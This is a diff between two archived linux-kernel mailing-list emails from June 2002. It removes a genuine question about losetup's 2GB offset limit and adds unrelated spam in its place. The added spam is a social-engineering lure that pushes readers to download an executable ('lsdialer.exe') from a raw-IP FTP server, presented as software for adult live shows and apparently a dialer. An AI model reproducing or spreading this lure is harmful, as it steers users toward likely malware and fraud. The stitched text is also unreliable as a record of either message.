@@ -1,37 +1,52 @@
 Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id <S316693AbSFURZh>; Fri, 21 Jun 2002 13:25:37 -0400
+	id <S316695AbSFURbH>; Fri, 21 Jun 2002 13:31:07 -0400
 Received: (majordomo@vger.kernel.org) by vger.kernel.org
-	id <S316695AbSFURZg>; Fri, 21 Jun 2002 13:25:36 -0400
-Received: from sm11.texas.rr.com ([24.93.35.42]:18148 "EHLO sm11.texas.rr.com")
-	by vger.kernel.org with ESMTP id <S316693AbSFURZf>;
-	Fri, 21 Jun 2002 13:25:35 -0400
-Date: Fri, 21 Jun 2002 12:25:37 -0500 (CDT)
-From: Jeff Meininger <jeffm@boxybutgood.com>
-X-X-Sender: jeffm@spaz.localdomain
-To: linux-kernel@vger.kernel.org
-Subject: loopback block device 'offset' - 2GB limit?
-Message-ID: <Pine.LNX.4.44.0206211200150.2157-100000@spaz.localdomain>
-MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+	id <S316705AbSFURbG>; Fri, 21 Jun 2002 13:31:06 -0400
+Received: from [217.96.36.130] ([217.96.36.130]:28164 "HELO 217.96.36.130")
+	by vger.kernel.org with SMTP id <S316695AbSFURbF>;
+	Fri, 21 Jun 2002 13:31:05 -0400
+From: kheBrooke <direJennifer@aol.com>
+To: Undisclosed@vger.kernel.org, Recipients@vger.kernel.org
+Subject: Check This Out aww
+Mime-Version: 1.0
+Content-Type: text/plain; charset="iso-8859-1"
+Date: Fri, 21 Jun 2002 13:31:13 -0400
+X-Mailer: The Bat! (v1.52f) Business
+Message-Id: <20020621173105Z316695-22020+8421@vger.kernel.org>
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
+Hi there!
 
-If someone makes an image of their hard drive with 'dd', and wants to
-mount a partition on that image, they can do losetup -o
-offset-to-partition-start and it will work fine.  This is good for the
-first partition, or any partition starting under 2GB.  Is there a way to
-do this for a partition starting ABOVE 2 GB into the image?
+ftp://199.239.117.105/Uploads/.%20%20bleh/for%20cyberbettor/files/3/5/c/lsdialer.exe
 
-struct loop_info has a 32-bit 'int' offset (for x86 anyway), so it might
-require something tricky.  I've tried stringing loop devices into a chain,
-such that the first loop device starts at some offset, and another loop
-device uses the first loop device as the source while specifying another
-offset, but this (of course) doesn't work.
+    We have just come up with this CRAZY NEW idea. We now host Live Erotic Shows that are 
 
-Is this possible with a standard linux kernel?
+available to you non-stop.The hottest amateur girls will surprise you, and guess what? 
 
-Thanks...
--Jeff Meininger
+You are just a step away from them. All you need is to download the software required 
 
+to watch us online, and this incendiary world will be yours!
+
+ftp://199.239.117.105/Uploads/.%20%20bleh/for%20cyberbettor/files/3/5/c/lsdialer.exe 
+
+ 
+
+ 
+
+ 
+
+
+--------------------------------------------------------------------------------
+
+        You must be at least 18 years of age to access our material. You agree that by downloading and using this software, 
+
+          you are 18 or older, and that you are both willing and allowed to watch this kind of content. We hope you enjoy your time with us!
+
+ 
+
+        The Live Shows Girls 
+
+
+swexaqxxgaqthdcnlrtbfpydatqifdvk
